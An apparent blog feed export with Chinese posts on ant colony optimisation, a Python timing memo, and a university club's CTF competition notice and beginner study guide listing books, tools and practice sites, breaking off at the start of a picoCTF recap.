        <content type="html"><![CDATA[<h2 id="蚁群算法"><a href="#蚁群算法" class="headerlink" title=":) 蚁群算法"></a>:) 蚁群算法</h2><h3 id="AS求解-TSP-参数一览-设任意两个城市的距离-d-ij-为欧几里德距离"><a href="#AS求解-TSP-参数一览-设任意两个城市的距离-d-ij-为欧几里德距离" class="headerlink" title="AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离)"></a>AS求解 TSP 参数一览(设任意两个城市的距离 $d_{ij}$ 为欧几里德距离)</h3><ul><li>AS 中的随机比例规则(random proportional): 对于每只蚂蚁 k,<br>  路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号</li></ul><br><ul><li>$ \tau_{o}(i, j) = \frac{m}{C^{nn}} $, m是蚂蚁个数, $C^{nn}$ 是由贪婪算法构造的路径的长度</li></ul><br><ul><li>设蚂蚁 k 当前所在城市为 i, 则其选择城市 j 作为下一个访问对象的概率为:</li></ul><p>$$<br>p_{k}(i,j) = \begin{cases}<br>\frac{[\tau(i, j) ]^{\alpha} [\eta(i, j)^{\beta } ]}{\sum_{u \in J_{k}(i)  }[\tau(i, u) ]^{\alpha} [\eta(i, u)^{\beta } ]} &amp; \text , ; j \in J_{k}(i) \<br>;;;;;;;;;;;; 0 &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合</li><li>$\eta(i, j)$ 是一个启发式信息, 通常由 $\eta(i, j) = \frac{1}{d_{ij}}$ 直接计算</li><li>$\tau(i, j)$ 表示边 (i, j) 上的信息素量</li><li>$\alpha$ 和 $\beta $ 是两个预先设置的参数, 实验表明 $\alpha$ = 1, $\beta $ = 2 ~ 5 比较合适</li></ul></li></ul><br><ul><li>城市 i 与 城市 j 的相连边上的信息素量 $\tau_(i, j)$ 按如下公式进行更新:</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \sum_{ k=1 }^{m} \Delta \tau_{k}(i, j)<br>\<br>\Delta \tau_{k}(i, j) = \begin{cases}<br>(C_{k})^{-1} &amp; , ; (i, j) \in R^{k} \<br>0 &amp; ,; other<br>\end{cases}<br>$$</p><ul><li><ul><li>m 是蚂蚁个数</li><li>$\rho$ 是信息素的蒸发率, 规定 $0 &lt; \rho \leqslant 1 $ , $\rho$ 通常设置为 = 0.5</li><li>$\Delta \tau_{k}(i, j)$ 是第 k 只蚂蚁在它经过的边上释放的信息素量(没放过当然就取 0 啦！), 它等于蚂蚁 k 本轮构建路径长度的倒数</li><li>$C_{k}$ 表示路径长度, 它是 $R^{k}$ 中所有边的长度和</li></ul></li></ul><h3 id="ACS-与-AS-的不同的三个方面参数一览"><a href="#ACS-与-AS-的不同的三个方面参数一览" class="headerlink" title="ACS 与 AS 的不同的三个方面参数一览"></a>ACS 与 AS 的不同的三个方面参数一览</h3><p>####状态转移规则，</p><ul><li>ACS中的伪随机比例规则(pseudorandom proportional): 对于每只蚂蚁 k,<br>  路径记忆向量 $R^{k}$ 按照访问顺序记录了所有 k 已经经过的程序序号</li></ul><ul><li>设蚂蚁 k 当前所在城市为 i, 则下一个访问城市:</li></ul><p>$$<br>j = \begin{cases}<br>arg ; max_{j \in J_{k}(i)} {[\tau(i, j) ], [\eta(i, j)^{\beta }]} &amp; \text , ; q \leqslant q_{0} \<br>S &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ 表示从城市 i 可以直接到达的且又不在蚂蚁访问过的城市序列 $R^{k}$ 中的城市集合</li><li>$\eta(i, j)$ 是一个启发式信息, 通常由 $\eta(i, j) = \frac{1}{d_{ij}}$ 直接计算</li><li>$\tau(i, j)$ 表示边 (i, j) 上的信息素量</li><li>$\beta$ 是描述信息素浓度和路径长度信息相对重要性的控制参数</li><li>$q_{0}$ 是一个 [0, 1] 区间内的参数, 当产生的随机数 $q \leqslant q_{0}$ 时, 蚂蚁直接选择使启发式信息与信息素量的 $\beta$ 指数乘积最大的下一城市节点, 我们通常称之为开发(exploitation); 反之, 当产生的随机数 $q &gt; q_{0}$ 时, ACS将和各种AS算法一样使用轮盘赌选择策略, 即偏向探索(biased exploration)</li></ul></li></ul><h4 id="信息素全局更新规则"><a href="#信息素全局更新规则" class="headerlink" title="信息素全局更新规则"></a>信息素全局更新规则</h4><ul><li>不论是信息素的蒸发还是释放, 都只在属于至今最优路径的边上进行</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \rho \cdot \Delta \tau_{b}(i, j) , \forall (i, j) \in T_{b}<br>$$</p><ul><li><ul><li>$\Delta \tau_{b}(i, j) = \frac{1}{C_{b}}$</li><li>参数 $\rho$ 代表信息素蒸发的速率, 新增加的信息素 $\Delta \tau_{b}(i, j)$ 被乘上系数 $\rho$ 后, 更新后的信息素浓度被控制在旧信息素量与新释放的信息素量之间, 用一种隐含的又更简单的方式实现了 MMAS 算法中对信息素量取值范围的限制</li></ul></li></ul><h4 id="信息素局部更新规则"><a href="#信息素局部更新规则" class="headerlink" title="信息素局部更新规则"></a>信息素局部更新规则</h4><p>$$<br>\tau(i, j) = (1 - \xi) \cdot \tau(i, j) + \xi \cdot \tau_{0}<br>$$</p><ul><li>$\xi$ 是信息素局部挥发速率, 满足 $0 &lt; \xi &lt; 1$, 通过实验发现 $\xi = 0.1$ </li><li>$\tau_{0}$ 是信息素的初始值, 取值为 $\frac{1}{nC^{nn}}$ 时, 对大多数实例有着非常好的性能. 其中 n 为城市个数, $C^{nn}$ 是由贪婪算法构造的路径的长度</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学校课程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一些杂乱的东西</title>
      <link href="2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
      <url>2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="能量是标量这句话意味深远呀-～"><a href="#能量是标量这句话意味深远呀-～" class="headerlink" title="能量是标量这句话意味深远呀 ～"></a>能量是标量这句话意味深远呀 ～</h4><p>一群人纠结了一天这个题目的结果是标量还是矢量，23333</p><p><img src="/img/Memo/memo1.png" class="lazyload" data-srcset="/img/Memo/memo1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="二进制的魅力"><a href="#二进制的魅力" class="headerlink" title="二进制的魅力~"></a>二进制的魅力~</h4><p>老久之前一直想记下来, 一直忘了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">time_start1 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate % <span class="number">2</span>) != <span class="number">0</span>:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 平均在这个数字 2.133270025253296</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">time_start2 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate &amp; <span class="number">0</span>) :</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 平均在这个数字 0.8398542404174805</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start2)</span><br></pre></td></tr></table></figure><h4 id="linux-趣事"><a href="#linux-趣事" class="headerlink" title="linux 趣事"></a>linux 趣事</h4><p>一直很好奇 vim 的  hjkl 方向键 以及 ~ 为什么是根目录…<br><a href="https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys">https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys</a></p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>佛大2019红帽杯相关咨询</title>
      <link href="2019/10/18/2019hmb/"/>
      <url>2019/10/18/2019hmb/</url>
      
        <content type="html"><![CDATA[<h3 id="1-什么是CTF"><a href="#1-什么是CTF" class="headerlink" title="1.什么是CTF"></a>1.什么是CTF</h3><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。</p><h3 id="2-什么是红帽杯"><a href="#2-什么是红帽杯" class="headerlink" title="2.什么是红帽杯"></a>2.什么是红帽杯</h3><p>红帽杯是由广东省计算机信息网络安全协会将于2019年11月在广州举办第三届红帽杯网络安全攻防（CTF）大赛。</p><ul><li>报名时间<br>10月10日00:00 - 11月07日24:00</li><li>初赛时间<br>11月10日09:00 - 11月11日09:00</li></ul><p>报名官方网站 <a href="https://www.cinsa.org.cn/2019redhat">https://www.cinsa.org.cn/2019redhat</a></p><p>欢迎咨询佛大信息安全协会</p><ul><li>微信号：<ul><li>范同学：fjw712452</li><li>刘同学：Glan5812 </li><li>徐同学：Gtari720</li></ul></li></ul><h3 id="3-入门CTF，你需要什么"><a href="#3-入门CTF，你需要什么" class="headerlink" title="3.入门CTF，你需要什么"></a>3.入门CTF，你需要什么</h3><ul><li><p>快速学习新事物的能力<br>  一个不一样的思考方式<br>  一颗乐于解决问题的心<br>  一些有趣的网络安全技术<br>  一段充实奋斗的时光</p></li><li><p>在这里，我们希望能给予你一些建议：</p><p>  善用 Google 搜索可以帮助你更好地提升自己<br>  掌握至少一门编程语言，比如 Python<br>  实践比什么都要管用<br>  保持对技术的好奇与渴望并坚持下去</p></li></ul><h3 id="4-CTF是怎么比赛的"><a href="#4-CTF是怎么比赛的" class="headerlink" title="4.CTF是怎么比赛的"></a>4.CTF是怎么比赛的</h3><p>由于 CTF 的考题范围其实比较宽广，目前也没有太明确的规定界限说会考哪些内容。但是就目前的比赛题型而言的话，主要还是依据常见的 Web 网络攻防、RE 逆向工程、Pwn 二进制漏洞利用、Crypto 密码攻击、Mobile 移动安全 以及 Misc 安全杂项 来进行分类。</p><h4 id="Web-网络攻防"><a href="#Web-网络攻防" class="headerlink" title="Web - 网络攻防"></a>Web - 网络攻防</h4><p>主要为 Web 安全中常见的漏洞，如 SQL 注入、XSS、CSRF、文件包含、文件上传、代码审计、PHP 弱类型等，Web 安全中常见的题型及解题思路，并提供了一些常用的工具。</p><h4 id="Reverse-Engineering-逆向工程"><a href="#Reverse-Engineering-逆向工程" class="headerlink" title="Reverse Engineering - 逆向工程"></a>Reverse Engineering - 逆向工程</h4><p>主要为逆向工程中的常见题型、工具平台、解题思路，进阶部分介绍了逆向工程中常见的软件保护、反编译、反调试、加壳脱壳技术。</p><h4 id="Pwn-二进制漏洞利用"><a href="#Pwn-二进制漏洞利用" class="headerlink" title="Pwn - 二进制漏洞利用"></a>Pwn - 二进制漏洞利用</h4><p>Pwn 题目主要考察二进制漏洞的发掘和利用，需要对计算机操作系统底层有一定的了解。在 CTF 竞赛中，PWN 题目主要出现在 Linux 平台上。</p><h4 id="Crypto-密码攻击"><a href="#Crypto-密码攻击" class="headerlink" title="Crypto - 密码攻击"></a>Crypto - 密码攻击</h4><p>主要包括古典密码学和现代密码学两部分内容，古典密码学趣味性强，种类繁多，现代密码学安全性高，对算法理解的要求较高。</p><h4 id="Mobile-移动安全"><a href="#Mobile-移动安全" class="headerlink" title="Mobile - 移动安全"></a>Mobile - 移动安全</h4><p>主要为安卓逆向中的常用工具和主要问题类型，安卓逆向常常需要一定的安卓开发知识，iOS 逆向题目在 CTF 竞赛中较少出现，因此不作过多介绍。</p><h4 id="Misc-安全杂项"><a href="#Misc-安全杂项" class="headerlink" title="Misc - 安全杂项"></a>Misc - 安全杂项</h4><p>以诸葛建伟翻译的《线上幽灵：世界头号黑客米特尼克自传》和一些典型 MISC 题为切入点，内容主要包括信息搜集、编码分析、取证分析、隐写分析等。</p><h3 id="5-CTF方向那么多，我选择那一条呢"><a href="#5-CTF方向那么多，我选择那一条呢" class="headerlink" title="5.CTF方向那么多，我选择那一条呢"></a>5.CTF方向那么多，我选择那一条呢</h3><ul><li><p>这需要你自己选择一个适合的方向，下面是各个方向的介绍。</p><ul><li><p>A方向：PWN+Reverse+Crypto随机搭配<br>  IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等</p></li><li><p>B方向：Web+Misc<br>  网络安全、内网渗透、数据库安全等</p></li><li><p>公共部分：Linux基础、计算机组成原理、操作系统原理、网络协议分析</p></li></ul></li><li><p>这是简单的介绍，去选择一条属于自己的路吧！</p><ul><li>PWN、Reverse偏重对汇编、逆向的理解</li><li>Crypto偏重对数学、算法的深入学习</li><li>Web偏重对技巧沉淀、快速搜索能力的挑战</li><li>Misc比较复杂，所有与计算机安全挑战有关的都算在其中</li></ul></li></ul><h3 id="6-我选好了路，但是怎么去学习呢"><a href="#6-我选好了路，但是怎么去学习呢" class="headerlink" title="6.我选好了路，但是怎么去学习呢"></a>6.我选好了路，但是怎么去学习呢</h3><p>下面推荐几本书：</p><ul><li><p>A方向：<br>IDA pro权威指南（重要）<br>揭秘家庭路由器0day漏洞挖掘技术<br>RE for Beginners（逆向工程入门）<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p></li><li><p>B方向：<br>Web应用安全权威指南（适合小白入门对WEB安全进行宏观的理解）<br>黑客攻防技术宝典 Web实战篇<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>代码审计：企业级Web代码安全架构</p></li></ul><h4 id="7-web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！"><a href="#7-web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！" class="headerlink" title="7.web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！"></a>7.<a href="https://tari0510.github.io/2019/10/17/2019hmb_guide/">web、Reverse、PWN、Crypto和Misc的详细入门指导请戳我！</a></h4><h3 id="8-总结"><a href="#8-总结" class="headerlink" title="8.总结"></a>8.<span id="ask_question">总结</span></h3><p>CTF可能门槛比较高，但是入门之后你会发现其乐趣 在学习过程中遇到挫折不要轻易放弃，建议先谷歌查找相关资料，实在查不到再求助他人。 关于如何提问，建议阅读这篇文章：<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md">提问的智慧</a> </p><p>有任何问题欢迎到群里或联系协会成员。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><ul><li><p>Q1: 要是我技术不好或者基础不太好怎么办？你们会教吗？</p></li><li><p>A1: 不用担心，我们会根据你们大部分人的基础，给予你们相关资料和多次线下培训。不用担心自己什么都不会，一开始谁都是小白，本次红帽杯参赛匆忙怕取得不了好成绩的，也可以为12月份百度杯，明年1月份安恒杯做准备喔！</p></li><li><p>Q2： 教练，我迫不及待想看看ctf大概是怎样的</p></li><li><p>A2： 这个是中科大的新生ctf赛。相对会简单些的。如果有迫不及待想了解ctf是怎样的同学可以注册个账号玩玩，不懂的可以百度或者群上问喔！</p><p>  <a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a><br>  2019 年度中国科学技术大学第六届信息安全竞赛即将开幕，科大信息安全大赛自 2014 年起已经连续举办五届，往届比赛均顺利举行，规模盛大，影响甚广。</p><p>  赛制：个人线上比赛，解题模式，约 25 道题目；<br>  比赛题目分为 4 类，分类如下：综合技能（general）、程序逆向与漏洞利用（binary）、密码学与数学（math）、网站安全（web）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>佛大2019红帽杯入门指导</title>
      <link href="2019/10/17/2019hmb_guide/"/>
      <url>2019/10/17/2019hmb_guide/</url>
      
        <content type="html"><![CDATA[<p><a href="#web">Web入门传送门</a><br><a href="#re">Re 逆向 入门传送门</a><br><a href="#pwn">PWN 二进制 入门传送门</a><br><a href="#crypto">Crypto 密码学 入门传送门</a><br><a href="#misc">Misc 杂项 入门传送门</a></p><p><a href="#catch_flag">萌新入门刷题传送门</a></p><h3 id="1-web的详细入门指导"><a href="#1-web的详细入门指导" class="headerlink" title="1.web的详细入门指导"></a><span id="web">1.web的详细入门指导</span></h3><p>首先，大略过一下最基础的语言语法HTML／CSS、JavaScript、PHP、SQL的基本知识（平均一个语言4小时足矣），要做到看到这些代码的时候不会畏惧，能看懂大部分，看到不懂的能通过google或者相关文档查懂。主要参考：<a href="http://www.w3school.com.cn/">http://www.w3school.com.cn/</a> 、<a href="http://www.runoob.com/">http://www.runoob.com/</a> , 这里不要求学很深，很浅很浅就行，后面边学边用掌握的会更快。</p><p>现在，你初步了解了一些语言知识，接下来你就需要开始在实践中学习与巩固。</p><p>当然就是实践了。这里，我建议你搭建一个个人的博客，初步了解这些语言的应用。在搭建博客的过程中，你需要学习对应的linux操作、Apache+PHP+Mysql环境的配置、域名解析、服务器端口配置等等。如何搭建博客，请自行google搜索。此外，你也可以编写一些好玩的网页来学习这些知识点。</p><p>如果你能完成如上所说的这些，尤其是第三点，那么恭喜你，你入门了，其实这些前期会遇到很多语言方面难免会遇到挫折，但是没关系，多百度多谷歌，多群里提问，我们都会及时给你解答。</p><ul><li><p>接下来可以了解基本的HTTP协议相关知识</p><ul><li><p>掌握HTTP请求：GET、POST、HEAD，能基本读懂一个HTTP数据包，了解GET、POST、HEAD的区别</p></li><li><p>能看懂HTTP响应包 404 403 200 500 302 301 …</p></li><li><p>了解Cookie、session、token，知道是什么东西，作用是什么，为什么需要这些东西</p></li><li><p>了解Referer、X-Forwarded-For等等的作用</p></li></ul></li><li><p>学漏洞知识点之前，如果你了解了如上所说的一些东西，那么就可以学习下面的知识(进阶)啦，当然能学懂上面的知识可能需要大概3周左右的时间，多坚持，多提问。</p><p>  sql注入</p><p>  XSS攻击</p><p>  文件上传漏洞</p><p>  文件包含漏洞</p><p>  命令执行漏洞</p><p>  。。。</p></li></ul><p>推荐一些学习站点<br><a href="https://ctf-wiki.github.io/ctf-wiki/&gt;">https://ctf-wiki.github.io/ctf-wiki/&gt;</a> <a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a> <a href="https://www.anquanke.com/">https://www.anquanke.com/</a> <a href="https://github.com/CHYbeta/Web-Security-Learning">https://github.com/CHYbeta/Web-Security-Learning</a></p><p>推荐一些题库<br><a href="https://cgctf.nuptsast.com/login">https://cgctf.nuptsast.com/login</a> <a href="https://www.jarvisoj.com/login">https://www.jarvisoj.com/login</a></p><p>推荐一些大牛的博客<br><a href="https://chybeta.github.io/">https://chybeta.github.io/</a> <a href="https://www.jianshu.com/u/bf30f18c872c">https://www.jianshu.com/u/bf30f18c872c</a> <a href="https://skysec.top/">https://skysec.top/</a> <a href="https://lorexxar.cn/">https://lorexxar.cn/</a> </p><p>推荐书籍<br>《白帽子讲web安全》 《黑客攻防技术宝典·Web实战篇》</p><h3 id="2-Reverse的详细入门指导"><a href="#2-Reverse的详细入门指导" class="headerlink" title="2.Reverse的详细入门指导"></a><span id="re">2.Reverse的详细入门指导</span></h3><p>逆向工程，Reverse，缩写一般为Re。旨在不知晓源码的情况下对程序进行分析，获取其流程，组织，结构等。CTF中一般为注册机这种形式。</p><p>最好会C语言和汇编语言，不必系统的学习汇编，上来先一条一条查指令手册，等熟悉了再仔细学习。 需了解常见加密算法的实现，要做到快速识别，无需了解攻击过程。</p><p>如何学习逆向呢，可以看下面这基本书学习基础知识，同时打比赛刷题，以赛带练。</p><ul><li><p>推荐书籍<br>  《汇编语言》（王爽） 这本比较老了，讲的8086汇编，但是讲的很好。</p><p>  《加密与解密》（第四版）（看雪论坛） 看雪出的经典书籍，名叫加密与解密实际上是讲逆向。各方各面都有讲到，很全面。</p><p>  《逆向工程核心原理》 主要是windows逆向，以OD为主要工具。讲的很好，面向零基础。</p><p>  下面的我没看过，不好评价。。。 《Reverse Engineering for Beginners》(电子书：<a href="https://beginners.re/)%EF%BC%88%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%BA%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B%EF%BC%89">https://beginners.re/)（中文版为《逆向工程权威指南》）</a> 《Android应用安全防护和逆向分析》 《Android软件安全与逆向分析》</p></li><li><p>常用工具<br>  IDA Pro 极其强大的反汇编/反编译/调试工具，二进制选手必须会用，优秀的二进制选手能把IDA运用到出神入化的地步。有关IDA的使用能讲好多好多。 吾爱破解论坛爱盘下载。</p><p>  x64dbg Windows平台优秀的开源反汇编器及调试器，可以看作Olly dbg的升级版，基本包含OD的全部功能，且一直在更新 官网下载。</p><p>  gdb Linux的调试器，没有GUI。pwn选手必须掌握的技能。也可以使用IDA的远程调试功能调试linx程序。 一般的Linux自带，没有的话apt安装。</p><p>  Jeb apk反编译工具，功能强大。</p><p>  jadx 开源的apk反编译工具，轻量级</p><p>  其他 dnSpy，xspy，CFF explorer等各类专用工具，需要靠做题中积累。</p></li><li><p>论坛与站点<br>  汇编语言指令学习：<a href="https://www.cnblogs.com/del/category/121079.html">https://www.cnblogs.com/del/category/121079.html</a> 这一系列文章细致的讲解了win32汇编，遇到不认识的指令可到这里查询（当然直接翻intel指令手册是最准确的）</p><p>  吾爱破解：知名破解论坛，注册有限制，需要10元注册或等开放。吾爱的爱盘内有大量常用工具，以及逆向专用虚拟机，可按需学习与使用。 <a href="https://www.52pojie.cn/">https://www.52pojie.cn/</a></p><p>  看雪论坛：知名逆向论坛 <a href="https://bbs.pediy.com/">https://bbs.pediy.com/</a></p><p>  安全客、先知等各类安全论坛，上面有各种大佬发的文章。</p></li></ul><h3 id="3-PWN的详细入门指导"><a href="#3-PWN的详细入门指导" class="headerlink" title="3.PWN的详细入门指导"></a>3.<span id="pwn">PWN的详细入门指导</span></h3><p>pwn，及pwn to own，在黑客俚语中由own演变而来。通过逆向分析二进制程序，发现其可能存在的漏洞，并进行利用，从而达到信息泄露、权限获取等目的。</p><p>需要掌握汇编语言、基础逆向方法。 入门推荐到CTF wiki的pwn板块学习，上面有极其详细的pwn教程，各类漏洞点及利用。</p><p>CTF一般为linux环境下的pwn，要熟悉linux的使用。 IDA Pro 强大的反编译工具，有了它就能轻松审计漏洞了。 gdb为做pwn题时调试必备的工具，网上有非常多关于gdb的教程。 pwndbg——gdb插件：<a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a> pwntools为专门用来做pwn题的工具，所以要学习python与pwntools。</p><p>其余学习教程： 一步一步学ROP系列：<br><a href="http://wooyun.jozxing.cc/static/drops/tips-6597.html">http://wooyun.jozxing.cc/static/drops/tips-6597.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-7551.html">http://wooyun.jozxing.cc/static/drops/papers-7551.html</a> <a href="http://wooyun.jozxing.cc/static/drops/binary-10638.html">http://wooyun.jozxing.cc/static/drops/binary-10638.html</a> <a href="http://wooyun.jozxing.cc/static/drops/papers-11390.html">http://wooyun.jozxing.cc/static/drops/papers-11390.html</a> 堆基础学习: glibc内存管理ptmalloc源代码分析.pdf linux内核源码(建议直接看malloc free源码) 堆基础(英文blog) 推荐书籍： 《深入理解计算机系统（原书第3版）》 《程序员的自我修养—链接、装载与库》</p><h3 id="4-Crypto的详细入门指导"><a href="#4-Crypto的详细入门指导" class="headerlink" title="4.Crypto的详细入门指导"></a>4.<span id="crypto">Crypto的详细入门指导</span></h3><p>密码学需要较强的数学基础。ctf wiki也是入门不错的选择。 了解各种密码的实现过程，相关的攻击方法。 各种密码推荐直接到英文维基学习，讲的十分详细，一般也会有源代码。 上来学习密码学可以抄脚本，不用太关心其数学原理。等深入了解后再详细研究。</p><p>古典密码——脑洞大开的密码：链接 RSA攻击汇总：<a href="https://xz.aliyun.com/t/2446#toc-32">https://xz.aliyun.com/t/2446#toc-32</a> RSAcoppersmiths攻击：<a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p>一堆密码学的题目：<a href="https://cryptopals.com/">https://cryptopals.com/</a></p><p>推荐书籍： 《深入浅出密码学——常用加密技术原理与应用》 《密码编码学与网络安全——原理与实践（第七版》 《图解密码技术》 《应用密码学：协议、算法与C源程序》</p><h3 id="5-Misc的详细入门指导"><a href="#5-Misc的详细入门指导" class="headerlink" title="5.Misc的详细入门指导"></a>5.<span id="misc">Misc的详细入门指导</span></h3><p>杂项，简称Misc。杂项的内容很多很广，需要选手有较大的知识面以及快速学习新鲜事物的能力。 一般包括取证，隐写分析，编码转换，信息收集，流量分析等。有时密码学中的古典密码也被放到杂项里去。其中取证与隐写是misc最重要的一块。需要选手掌握各种花式隐写套路，需有较强的脚本功底，会用各类隐写工具。</p><p>隐写 <a href="https://www.jianshu.com/p/02fdd5edd9fc">https://www.jianshu.com/p/02fdd5edd9fc</a><br>流量分析 《Wireshark网络分析就这么简单》<br>ctf-wiki: <a href="https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/</a></p><h3 id="适合萌新刷题入门传送门"><a href="#适合萌新刷题入门传送门" class="headerlink" title="适合萌新刷题入门传送门"></a><span id="catch_flag">适合萌新刷题入门传送门</span></h3><ul><li><p><a href="https://adworld.xctf.org.cn/">攻防世界 有萌新区</a></p></li><li><p><a href="https://hack.lug.ustc.edu.cn/">2019中科大ctf新生赛</a></p></li><li><p><a href="https://cgctf.nuptsast.com/">南京邮电大学网络攻防平台 较多为简单题</a></p></li><li><p><a href="https://picoctf.com/">picoCTF2018和2019 美国面向高中生的ctf比赛</a></p></li><li><p><a href="https://github.com/ustclug/hackergame2018-writeups">2018中科大ctf新生赛 github存档</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019pico小汇总</title>
      <link href="2019/10/13/2019pico/"/>
      <url>2019/10/13/2019pico/</url>
      
        <content type="html"><![CDATA[<h4 id="和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。"><a href="#和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。" class="headerlink" title="和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。"></a>和两位新认识的小伙伴一起玩了1天，虽然解出来的题不算很多，但玩的还是很开心。picoctf相对来说也会简单些，但是也还是有收货的。在此记录一下。</h4><p>由于国庆比较忙，也没有继续在解题了，然后也忘了写记录了，emmm。下图是我们队伍的1天的解题成果。这是报了小伙伴的大腿@guoguo @回忆<br><img src="/img/ctf/2019pico/1.png" class="lazyload" data-srcset="/img/ctf/2019pico/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 